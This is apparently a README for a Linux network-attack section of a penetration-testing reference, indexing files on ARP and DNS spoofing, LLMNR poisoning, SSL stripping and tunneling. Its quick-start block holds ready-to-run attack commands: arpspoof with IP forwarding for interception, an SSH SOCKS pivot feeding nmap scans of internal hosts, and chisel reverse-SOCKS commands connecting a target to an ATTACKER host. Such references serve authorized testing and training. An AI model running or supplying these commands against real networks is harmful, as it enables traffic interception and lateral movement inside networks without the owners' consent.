# Linux Network Attacks

Network attack techniques and tunneling for lateral movement.

## Files

| File | Description |
|------|-------------|
| [`network_attacks.md`](network_attacks.md) | Network attack reference — ARP spoofing, DNS spoofing, LLMNR/NBT-NS poisoning, SSH MitM, SSL stripping, NFS exploitation, SNMP, Redis, memcached, rsync |
| [`port_forward.md`](port_forward.md) | Port forwarding and tunneling — SSH (local/remote/dynamic), chisel, socat, netcat relays, iptables, proxychains, ligolo-ng |

## Quick Start

```bash
# ARP spoof + sniff
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth0 -t TARGET GATEWAY

# SSH SOCKS proxy for internal scanning
ssh -D 1080 user@PIVOT
proxychains nmap -sT -Pn INTERNAL_TARGET

# Chisel reverse SOCKS (no SSH needed)
# Attacker: chisel server --reverse --port 8000
# Target:   chisel client ATTACKER:8000 R:1080:socks
```
